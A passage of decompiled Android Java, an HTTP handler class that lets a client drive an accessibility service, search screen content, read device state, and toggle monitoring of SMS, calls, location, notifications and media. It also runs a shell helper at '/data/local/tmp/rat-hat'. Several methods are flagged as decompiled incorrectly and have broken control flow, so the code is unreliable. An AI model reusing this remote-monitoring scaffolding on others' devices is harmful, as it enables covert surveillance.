                    g0Var.m1104X(EnumC0890c.VERIFY_MODE);
                    ConcurrentLinkedQueue concurrentLinkedQueue = g0Var.f895q;
                    if (!concurrentLinkedQueue.contains(str)) {
                        concurrentLinkedQueue.offer(str);
                    }
                }
                apiResult.setData(Boolean.valueOf(z2));
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: Z */
    public static void m484Z(CombineFiltersWithOr combineFiltersWithOr, AbstractC0381k abstractC0381k) {
        String delegateId;
        if (combineFiltersWithOr != null) {
            try {
                delegateId = combineFiltersWithOr.getDelegateId();
            } catch (Exception e2) {
                AbstractC0026q.m186s("HttpServer", e2);
                return;
            }
        } else {
            delegateId = null;
        }
        C0416e o12 = o1(delegateId);
        if (m508x(o12, abstractC0381k)) {
            return;
        }
        if (o12 == null) {
            m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
            return;
        }
        SearchNodeListResultVO m1069h = o12.m1069h(combineFiltersWithOr);
        ApiResult apiResult = new ApiResult();
        apiResult.setData(m1069h);
        apiResult.setCode(200);
        apiResult.setMsg("OK");
        apiResult.setCount(1);
        apiResult.setSuccess(Boolean.TRUE);
        String m693N = AbstractC0252h.m693N(apiResult);
        abstractC0381k.f771l = apiResult.getCode().intValue();
        abstractC0381k.m952h(m693N);
        abstractC0381k.mo787l();
    }

    public static void Z0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByTextStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:15:0x005b A[Catch: Exception -> 0x0116, TryCatch #0 {Exception -> 0x0116, blocks: (B:2:0x0000, B:4:0x0007, B:8:0x0011, B:10:0x0019, B:12:0x0023, B:13:0x0033, B:15:0x005b, B:16:0x005e, B:18:0x0064, B:20:0x00e7, B:23:0x006a, B:25:0x0070, B:27:0x008a, B:29:0x0090, B:34:0x009f, B:36:0x00b9, B:38:0x00bf, B:40:0x00c5, B:43:0x00cd, B:45:0x00fc), top: B:1:0x0000 }] */
    /* JADX WARN: Removed duplicated region for block: B:25:0x0070 A[Catch: Exception -> 0x0116, TryCatch #0 {Exception -> 0x0116, blocks: (B:2:0x0000, B:4:0x0007, B:8:0x0011, B:10:0x0019, B:12:0x0023, B:13:0x0033, B:15:0x005b, B:16:0x005e, B:18:0x0064, B:20:0x00e7, B:23:0x006a, B:25:0x0070, B:27:0x008a, B:29:0x0090, B:34:0x009f, B:36:0x00b9, B:38:0x00bf, B:40:0x00c5, B:43:0x00cd, B:45:0x00fc), top: B:1:0x0000 }] */
    /* JADX WARN: Removed duplicated region for block: B:27:0x008a A[Catch: Exception -> 0x0116, TryCatch #0 {Exception -> 0x0116, blocks: (B:2:0x0000, B:4:0x0007, B:8:0x0011, B:10:0x0019, B:12:0x0023, B:13:0x0033, B:15:0x005b, B:16:0x005e, B:18:0x0064, B:20:0x00e7, B:23:0x006a, B:25:0x0070, B:27:0x008a, B:29:0x0090, B:34:0x009f, B:36:0x00b9, B:38:0x00bf, B:40:0x00c5, B:43:0x00cd, B:45:0x00fc), top: B:1:0x0000 }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void Z1(AbstractC0381k abstractC0381k) {
        boolean z2;
        try {
            if (!AbstractC0252h.m710n() && !AbstractC0252h.m711o()) {
                z2 = false;
                long j2 = (MainApplication.getInstance() != null || MainApplication.getInstance().getCheckThread() == null) ? 0L : MainApplication.getInstance().getCheckThread().f354p.get();
                ApiResult apiResult = new ApiResult();
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                Boolean bool = Boolean.TRUE;
                apiResult.setSuccess(bool);
                apiResult.setData(bool);
                if (!AbstractC0252h.m711o()) {
                    AbstractC0207l.m420c();
                }
                if (!C0435x.m1159R() || AbstractC0251g.m656c()) {
                    if (!AbstractC0956a.m1443a()) {
                        apiResult.setData(Boolean.FALSE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    if (MyAccessibilityService.m554P() != null && !MyAccessibilityService.m554P().m529j()) {
                        if (j2 <= 0) {
                            apiResult.setData(Boolean.FALSE);
                            String m693N2 = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N2);
                            abstractC0381k.mo787l();
                            return;
                        }
                        if ((AbstractC0251g.p0() || C0420i.m1118O()) && AbstractC0251g.r0() && !z2) {
                            apiResult.setData(Boolean.FALSE);
                            String m693N3 = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N3);
                            abstractC0381k.mo787l();
                            return;
                        }
                    }
                    apiResult.setData(Boolean.FALSE);
                    String m693N4 = AbstractC0252h.m693N(apiResult);
                    abstractC0381k.f771l = apiResult.getCode().intValue();
                    abstractC0381k.m952h(m693N4);
                    abstractC0381k.mo787l();
                    return;
                }
                String m693N5 = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N5);
                abstractC0381k.mo787l();
                return;
            }
            z2 = true;
            if (MainApplication.getInstance() != null) {
            }
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            Boolean bool2 = Boolean.TRUE;
            apiResult2.setSuccess(bool2);
            apiResult2.setData(bool2);
            if (!AbstractC0252h.m711o()) {
            }
            if (!C0435x.m1159R()) {
            }
            if (!AbstractC0956a.m1443a()) {
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void Z2(List list, AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            C0416e m523d = MyAccessibilityService.m554P().m523d("com.android.settings", list);
            ApiResult apiResult = new ApiResult();
            if (m523d != null) {
                apiResult.setData(m523d.f864c);
                apiResult.setCount(1);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.valueOf(AbstractC0251g.n1()));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: a */
    public static void m485a(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(MyAccessibilityService.m554P() != null ? Boolean.TRUE : Boolean.FALSE);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void a0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByText(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:22:0x0016, code lost:
    
        if (r4.intValue() < 1) goto L11;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void a1(String str, CombineFilter combineFilter, Integer num, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (combineFilter == null || o12 == null) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
                return;
            }
            if (num != null) {
                try {
                } catch (Exception e2) {
                    AbstractC0026q.m186s("AccessibilityDelegate", e2);
                }
            }
            num = 1;
            UiObject m1075n = o12.m1075n(combineFilter);
            if (m1075n != null) {
                searchNodeResultVO = o12.m1059D(m1075n.findParentByCombine(combineFilter, num));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void a2(AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setData(MyAccessibilityService.m554P().k0());
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void a3(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            AbstractC0252h.m681B(false, true);
            Boolean bool = Boolean.TRUE;
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(bool);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: b */
    public static void m486b(AbstractC0381k abstractC0381k) {
        int i2;
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(new LinkedList());
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            MessageGroupVO messageGroupVO = new MessageGroupVO();
            messageGroupVO.setGroupCode("DEVICE_DEBUG_EVENT");
            messageGroupVO.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getHeartThread() == null) ? 0 : MainApplication.getInstance().getHeartThread().f370e);
            ((List) apiResult.getData()).add(messageGroupVO);
            MessageGroupVO messageGroupVO2 = new MessageGroupVO();
            messageGroupVO2.setGroupCode("BATTERY_EVENT");
            messageGroupVO2.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getBatteryReceiver() == null) ? 0 : MainApplication.getInstance().getBatteryReceiver().f275a);
            ((List) apiResult.getData()).add(messageGroupVO2);
            MessageGroupVO messageGroupVO3 = new MessageGroupVO();
            messageGroupVO3.setGroupCode("BOOT_EVENT");
            messageGroupVO3.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getBootReceiver() == null) ? 0 : MainApplication.getInstance().getBootReceiver().f277a);
            ((List) apiResult.getData()).add(messageGroupVO3);
            MessageGroupVO messageGroupVO4 = new MessageGroupVO();
            messageGroupVO4.setGroupCode("NETWORK_EVENT");
            messageGroupVO4.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getNetWorkReceiver() == null) ? 0 : MainApplication.getInstance().getNetWorkReceiver().f280a);
            ((List) apiResult.getData()).add(messageGroupVO4);
            MessageGroupVO messageGroupVO5 = new MessageGroupVO();
            messageGroupVO5.setGroupCode("POWER_EVENT");
            messageGroupVO5.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getPowerReceiver() == null) ? 0 : MainApplication.getInstance().getPowerReceiver().f282a);
            ((List) apiResult.getData()).add(messageGroupVO5);
            MessageGroupVO messageGroupVO6 = new MessageGroupVO();
            messageGroupVO6.setGroupCode("DEVICE_APPLICATION_EVENT");
            messageGroupVO6.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getPackageReceiver() == null) ? 0 : MainApplication.getInstance().getPackageReceiver().f281a);
            ((List) apiResult.getData()).add(messageGroupVO6);
            MessageGroupVO messageGroupVO7 = new MessageGroupVO();
            messageGroupVO7.setGroupCode("SCREEN_EVENT");
            messageGroupVO7.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getScreenReceiver() == null) ? 0 : Integer.valueOf(MainApplication.getInstance().getScreenReceiver().f284a.get()));
            ((List) apiResult.getData()).add(messageGroupVO7);
            MessageGroupVO messageGroupVO8 = new MessageGroupVO();
            messageGroupVO8.setGroupCode("SHUTDOWN_EVENT");
            messageGroupVO8.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getShutDownReceiver() == null) ? 0 : MainApplication.getInstance().getShutDownReceiver().f285a);
            ((List) apiResult.getData()).add(messageGroupVO8);
            MessageGroupVO messageGroupVO9 = new MessageGroupVO();
            messageGroupVO9.setGroupCode("SMS_EVENT");
            messageGroupVO9.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getSmsReceiver() == null) ? 0 : MainApplication.getInstance().getSmsReceiver().f286a);
            ((List) apiResult.getData()).add(messageGroupVO9);
            MessageGroupVO messageGroupVO10 = new MessageGroupVO();
            messageGroupVO10.setGroupCode("CALL_EVENT");
            messageGroupVO10.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getCallReceiver() == null) ? 0 : MainApplication.getInstance().getCallReceiver().f278a);
            ((List) apiResult.getData()).add(messageGroupVO10);
            MessageGroupVO messageGroupVO11 = new MessageGroupVO();
            messageGroupVO11.setGroupCode("LOCATION_EVENT");
            if (C0927a.f2110b == null) {
                C0927a.f2110b = new C0927a();
            }
            if (C0927a.f2110b != null) {
                if (C0927a.f2110b == null) {
                    C0927a.f2110b = new C0927a();
                }
                i2 = C0927a.f2110b.f2111a;
            } else {
                i2 = 0;
            }
            messageGroupVO11.setEnable(i2);
            ((List) apiResult.getData()).add(messageGroupVO11);
            MessageGroupVO messageGroupVO12 = new MessageGroupVO();
            messageGroupVO12.setGroupCode("DEVICE_PHOTO_CHANGE_EVENT");
            messageGroupVO12.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getPhotoAlbumContentObserver() == null) ? 0 : MainApplication.getInstance().getPhotoAlbumContentObserver().f2311b);
            ((List) apiResult.getData()).add(messageGroupVO12);
            MessageGroupVO messageGroupVO13 = new MessageGroupVO();
            messageGroupVO13.setGroupCode("DEVICE_VIDEO_CHANGE_EVENT");
            messageGroupVO13.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getVideoAlbumContentObserver() == null) ? 0 : MainApplication.getInstance().getVideoAlbumContentObserver().f2314b);
            ((List) apiResult.getData()).add(messageGroupVO13);
            MessageGroupVO messageGroupVO14 = new MessageGroupVO();
            messageGroupVO14.setGroupCode("DEVICE_AUDIO_CHANGE_EVENT");
            messageGroupVO14.setEnable((MainApplication.getInstance() == null || MainApplication.getInstance().getAudioAlbumContentObserver() == null) ? 0 : MainApplication.getInstance().getAudioAlbumContentObserver().f2307b);
            ((List) apiResult.getData()).add(messageGroupVO14);
            MessageGroupVO messageGroupVO15 = new MessageGroupVO();
            messageGroupVO15.setGroupCode("NOTIFICATION_POSTED_EVENT");
            messageGroupVO15.setEnable(CustomNotificationService.f315c != null ? CustomNotificationService.f315c.f316a : 0);
            ((List) apiResult.getData()).add(messageGroupVO15);
            MessageGroupVO messageGroupVO16 = new MessageGroupVO();
            messageGroupVO16.setGroupCode("DEVICE_ADMIN_EVENT");
            int i3 = CustomAdminReceiver.f279a;
            int i4 = 1;
            if (!Objects.equals(AbstractC0251g.C0().getIsAdminActive(), 1)) {
                i4 = 0;
            }
            messageGroupVO16.setEnable(i4);
            ((List) apiResult.getData()).add(messageGroupVO16);
            apiResult.setCount(Integer.valueOf(((List) apiResult.getData()).size()));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void b0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByTextContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void b1(String str, CombineFilter combineFilter, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1075n;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
                return;
            }
            try {
                m1075n = o12.m1075n(combineFilter);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1075n != null) {
                searchNodeResultVO = o12.m1059D(m1075n.findParentUtilCombine(combineFilter));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void b2(ReqMonitorLocationVO reqMonitorLocationVO, AbstractC0381k abstractC0381k) {
        try {
            if (reqMonitorLocationVO == null) {
                m500p(abstractC0381k, "reqMonitorLocation不能为空");
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            apiResult.setData(C0929c.f2113f != null ? Boolean.valueOf(C0929c.f2113f.m1394b(reqMonitorLocationVO)) : Boolean.FALSE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void b3(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            if (C0397d.m963c() != null) {
                apiResult.setData(Boolean.valueOf(C0397d.m963c().m966e()));
                apiResult.setCount(1);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: c */
    public static void m487c(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(MyAccessibilityService.m552N());
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void c0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByTextEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void c1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            Boolean bool = Boolean.TRUE;
            apiResult.setSuccess(bool);
            apiResult.setData(Boolean.FALSE);
            if (MyAccessibilityService.m554P() != null) {
                MyAccessibilityService.m554P().m516A();
                MyAccessibilityService.m554P().m540u();
                apiResult.setData(bool);
            }
            AbstractC0184g.m349c();
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void c2(AbstractC0381k abstractC0381k) {
        EnumC0348c enumC0348c;
        try {
            ApiResult apiResult = new ApiResult();
            C0349d m881b = C0349d.m881b();
            synchronized (m881b) {
                enumC0348c = m881b.f678b;
            }
            apiResult.setData(enumC0348c);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void c3(AbstractC0381k abstractC0381k) {
        A1(abstractC0381k, "/data/local/tmp/rat-hat server --stop");
    }

    /* renamed from: d */
    public static void m488d(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData((String) MyAccessibilityService.f326v.get());
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void d0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByTextMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void d1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
